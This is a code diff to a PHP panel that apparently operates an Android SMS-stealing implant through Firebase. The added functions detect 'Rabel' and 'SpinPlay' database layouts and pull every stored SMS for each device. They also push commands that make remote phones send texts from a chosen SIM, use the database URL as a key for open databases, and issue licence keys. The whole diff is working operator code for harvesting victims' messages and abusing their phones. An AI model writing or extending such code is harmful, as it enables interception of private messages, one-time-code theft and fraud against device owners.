@@ -171,6 +171,130 @@ function rebel_create_key(string $type = 'web', int $maxUses = 1, int $ttlDays =
     return $key;
 }
 
+/** Resolve Firebase auth key — same as rebel.py public DB fallback (URL as key). */
+function rebel_firebase_auth_key(string $url, string $key): string
+{
+    $key = trim($key);
+    if ($key !== '') {
+        return $key;
+    }
+    return rtrim($url, '/');
+}
+
+/** Detect Firebase schema from shallow root keys (matches panel discoverInstance). */
+function rebel_detect_schema(?array $roots, string $url = ''): string
+{
+    if (is_array($roots)) {
+        if (array_key_exists('messages', $roots)) {
+            return 'rabel';
+        }
+        if (array_key_exists('clients', $roots)) {
+            return 'rabel';
+        }
+        if (array_key_exists('devices', $roots) || array_key_exists('devices_status', $roots)) {
+            return 'spinplay';
+        }
+    }
+    if ($url !== '' && stripos($url, 'rabel') !== false) {
+        return 'rabel';
+    }
+    return 'spinplay';
+}
+
+/** All SMS read paths — rebel.py uses messages/{id}; SpinPlay uses devices/.../all_sms */
+function rebel_sms_paths_for_device(string $deviceId, string $schema = 'rabel', string $deviceNode = 'clients'): array
+{
+    $id = trim($deviceId);
+    if ($id === '') {
+        return [];
+    }
+
+    $node = $deviceNode !== '' ? $deviceNode : 'clients';
+    $bases = array_values(array_unique([$node, 'clients', 'devices', 'devices_status']));
+    $paths = [];
+
+    // Rabel / rebel.py primary path first
+    $paths[] = 'messages/' . $id;
+
+    foreach ($bases as $n) {
+        if ($n === '') {
+            continue;
+        }
+        $paths[] = $n . '/' . $id . '/all_sms';
+        $paths[] = $n . '/' . $id . '/new_sms';
+        $paths[] = $n . '/' . $id . '/sms';
+        $paths[] = $n . '/' . $id . '/messages';
+    }
+
+    if ($schema === 'rabel') {
+        // Keep messages/ first; already added
+    } elseif ($schema === 'spinplay') {
+        // Prefer device-node paths before global messages/
+        $preferred = [];
+        foreach ($bases as $n) {
+            if ($n === '') {
+                continue;
+            }
+            $preferred[] = $n . '/' . $id . '/all_sms';
+            $preferred[] = $n . '/' . $id . '/new_sms';
+            $preferred[] = $n . '/' . $id . '/sms';
+            $preferred[] = $n . '/' . $id . '/messages';
+        }
+        $preferred[] = 'messages/' . $id;
+        $paths = array_values(array_unique($preferred));
+    }
+
+    return array_values(array_unique($paths));
+}
+
+/** Send paths with payload type — rebel.py: clients/{id}/webhookEvent/sendSms */
+function rebel_send_paths_for_device(string $deviceId, string $schema = 'rabel', string $deviceNode = 'clients'): array
+{
+    $id = trim($deviceId);
+    if ($id === '') {
+        return [];
+    }
+
+    $out = [];
+    $node = $deviceNode !== '' ? $deviceNode : 'clients';
+
+    if ($schema === 'spinplay') {
+        foreach (array_values(array_unique([$node, 'devices', 'clients'])) as $n) {
+            $out[] = ['path' => $n . '/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay'];
+        }
+        $out[] = ['path' => 'clients/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
+    } else {
+        foreach (array_values(array_unique(['clients', $node])) as $n) {
+            if ($n === '') {
+                continue;
+            }
+            $out[] = ['path' => $n . '/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
+        }
+        $out[] = ['path' => 'devices/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay'];
+    }
+
+    return $out;
+}
+
+function rebel_send_payload_for_type(string $type, int $sim, string $to, string $message): array
+{
+    $sim = max(1, $sim);
+    if ($type === 'spinplay') {
+        return [
+            'to' => $to,
+            'message' => $message,
+            'sim' => $sim - 1,
+        ];
+    }
+
+    return [
+        'from' => $sim,
+        'to' => $to,
+        'message' => $message,
+        'isSended' => false,
+    ];
+}
+
 /** Same as rebel.py normalize_phone() */
 function rebel_normalize_phone(string $raw): string
 {
@@ -187,9 +311,10 @@ function rebel_normalize_phone(string $raw): string
 /** Same as rebel.py firebase_req() */
 function rebel_firebase_req(string $method, string $url, string $key, string $path, ?array $data = null): ?array
 {
+    $authKey = rebel_firebase_auth_key($url, $key);
     $full = rtrim($url, '/') . '/' . ltrim($path, '/') . '.json';
-    if ($key !== '') {
-        $full .= '?auth=' . rawurlencode($key);
+    if ($authKey !== '') {
+        $full .= '?auth=' . rawurlencode($authKey);
     }
 
     $headers = ['Content-Type: application/json', 'Accept: application/json'];
@@ -249,10 +374,166 @@ function rebel_firebase_req(string $method, string $url, string $key, string $pa
     return is_array($parsed) ? $parsed : [];
 }
 
+function rebel_sms_as_list($raw): array
+{
+    if (!is_array($raw)) {
+        return [];
+    }
+    $out = [];
+    foreach ($raw as $v) {
+        if (is_array($v)) {
+            $out[] = $v;
+        }
+    }
+    return $out;
+}
+
+function rebel_sms_to_ms($v): int
+{
+    if ($v === null || $v === '') {
+        return 0;
+    }
+    if (is_int($v) && $v > 0) {
+        return $v < 1000000000000 ? $v * 1000 : $v;
+    }
+    if (is_float($v) && $v > 0) {
+        $n = (int) $v;
+        return $n < 1000000000000 ? $n * 1000 : $n;
+    }
+    if (is_string($v)) {
+        if (is_numeric($v) && (float) $v > 0) {
+            $n = (float) $v;
+            return $n < 1000000000000 ? (int) ($n * 1000) : (int) $n;
+        }
+        $t = strtotime($v);
+        if ($t !== false) {
+            return $t * 1000;
+        }
+    }
+    return 0;
+}
+
+function rebel_sms_msg_time(array $m): int
+{
+    $keys = ['date', 'timestamp', 'dateTime', 'datetime', 'time', 'received_at', 'sent_at', 'created_at', 'receivedAt', 'sentAt', 'sms_time', 'msg_time', 'last_modified', 'received_time', 'sent_time', 'id'];
+    foreach ($keys as $k) {
+        $ms = rebel_sms_to_ms($m[$k] ?? null);
+        if ($ms > 0) {
+            return $ms;
+        }
+    }
+    $sk = rebel_sms_to_ms($m['_sortKey'] ?? null);
+    if ($sk > 0) {
+        return $sk;
+    }
+    return rebel_sms_to_ms($m['date_readable'] ?? null);
+}
+
+/** Normalize SMS record — same fields as rebel.py + panel normalizeSms() */
+function rebel_sms_normalize($m): ?array
+{
+    if (!is_array($m)) {
+        return null;
+    }
+    $body = trim((string)($m['body'] ?? $m['message'] ?? $m['text'] ?? $m['content'] ?? $m['msg'] ?? ''));
+    if ($body === '') {
+        return null;
+    }
+    $ts = rebel_sms_msg_time($m);
+    return [
+        'address' => (string)($m['address'] ?? $m['sender'] ?? $m['from'] ?? $m['number'] ?? $m['originatingAddress'] ?? '?'),
+        'body' => $body,
+        'date_readable' => (string)($m['date_readable'] ?? $m['dateTime'] ?? $m['date_time'] ?? $m['time'] ?? $m['date'] ?? '—'),
+        'type' => strtolower((string)($m['type'] ?? $m['direction'] ?? $m['sms_type'] ?? 'inbox')),
+        'ts' => $ts,
+        'device_id' => (string)($m['device_id'] ?? $m['deviceId'] ?? $m['client_id'] ?? $m['clientId'] ?? $m['dev_id'] ?? $m['devId'] ?? ''),
+    ];
+}
+
+function rebel_sms_belongs_to_device(array $sms, string $deviceId, string $compositeId = ''): bool
+{
+    $did = trim((string)($sms['device_id'] ?? ''));
+    if ($did === '') {
+        return true;
+    }
+    if ($did === $deviceId || ($compositeId !== '' && $did === $compositeId)) {
+        return true;
+    }
+    return false;
+}
+
+function rebel_merge_sms_lists(array ...$lists): array
+{
+    $merged = [];
+    $seen = [];
+    foreach ($lists as $list) {
+        foreach ($list as $s) {
+            if (!is_array($s)) {
+                continue;
+            }
+            $key = ($s['address'] ?? '?') . '|' . ($s['ts'] ?? 0) . '|' . substr((string)($s['body'] ?? ''), 0, 80);
+            if (isset($seen[$key])) {
+                continue;
+            }
+            $seen[$key] = true;
+            $merged[] = $s;
+        }
+    }
+    usort($merged, static fn($a, $b) => ($b['ts'] ?? 0) <=> ($a['ts'] ?? 0));
+    return $merged;
+}
+
 /**
- * Send SMS to device — same payload/path as rebel.py:
- * PUT clients/{device_id}/webhookEvent/sendSms
- * payload: {from, to, message, isSended:false}
+ * Fetch SMS for device — rebel.py messages/{id} + SpinPlay fallbacks.
+ */
+function rebel_fetch_sms_for_device(
+    string $url,
+    string $key,
+    string $deviceId,
+    string $schema = 'rabel',
+    string $deviceNode = 'clients',
+    string $compositeId = ''
+): array {
+    if ($deviceId === '') {
+        return ['ok' => false, 'error' => 'Device id required', 'messages' => []];
+    }
+    if ($url === '') {
+        return ['ok' => false, 'error' => 'Firebase URL missing', 'messages' => []];
+    }
+
+    $authKey = rebel_firebase_auth_key($url, $key);
+    $paths = rebel_sms_paths_for_device($deviceId, $schema, $deviceNode);
+    $all = [];
+
+    foreach ($paths as $path) {
+        $data = rebel_firebase_req('GET', $url, $authKey, $path);
+        if ($data === null) {
+            continue;
+        }
+        foreach (rebel_sms_as_list($data) as $raw) {
+            $norm = rebel_sms_normalize($raw);
+            if ($norm === null) {
+                continue;
+            }
+            if (!rebel_sms_belongs_to_device($norm, $deviceId, $compositeId)) {
+                continue;
+            }
+            unset($norm['device_id']);
+            $all[] = $norm;
+        }
+    }
+
+    $messages = rebel_merge_sms_lists($all);
+    return [
+        'ok' => true,
+        'messages' => $messages,
+        'count' => count($messages),
+        'schema' => $schema,
+    ];
+}
+
+/**
+ * Send SMS to device — same payload/path as rebel.py with multi-path fallback.
  */
 function rebel_send_sms_to_device(
     string $url,
@@ -273,35 +554,32 @@ function rebel_send_sms_to_device(
     }
 
     $sim = max(1, $sim);
+    $authKey = rebel_firebase_auth_key($url, $key);
+    $attempts = rebel_send_paths_for_device($deviceId, $schema, $deviceNode);
+    $lastError = 'Failed to send SMS — device offline or Firebase error';
 
-    if ($schema === 'spinplay') {
-        $path = ($deviceNode ?: 'devices') . '/' . rawurlencode($deviceId) . '/manual_commands/send_sms';
-        $payload = [
-            'to' => $to,
-            'message' => $message,
-            'sim' => $sim - 1,
-        ];
-    } else {
-        $path = 'clients/' . rawurlencode($deviceId) . '/webhookEvent/sendSms';
-        $payload = [
-            'from' => $sim,
-            'to' => $to,
-            'message' => $message,
-            'isSended' => false,
-        ];
+    foreach ($attempts as $attempt) {
+        $path = (string)($attempt['path'] ?? '');
+        $type = (string)($attempt['type'] ?? 'rabel');
+        if ($path === '') {
+            continue;
+        }
+        $payload = rebel_send_payload_for_type($type, $sim, $to, $message);
+        $res = rebel_firebase_req('PUT', $url, $authKey, $path, $payload);
+        if ($res !== null) {
+            return [
+                'ok' => true,
+                'message' => 'SMS sent to device',
+                'sim' => $sim,
+                'to' => $to,
+                'path' => $path,
+                'schema' => $type,
+            ];
+        }
+        $lastError = 'Failed via ' . $path;
     }
 
-    $res = rebel_firebase_req('PUT', $url, $key, $path, $payload);
-    if ($res !== null) {
-        return [
-            'ok' => true,
-            'message' => 'SMS sent to device',
-            'sim' => $sim,
-            'to' => $to,
-        ];
-    }
-
-    return ['ok' => false, 'error' => 'Failed to send SMS — device offline or Firebase error'];
+    return ['ok' => false, 'error' => $lastError];
 }
 
 /** Shared Firebase project list — admin.php writes, k.php reads */
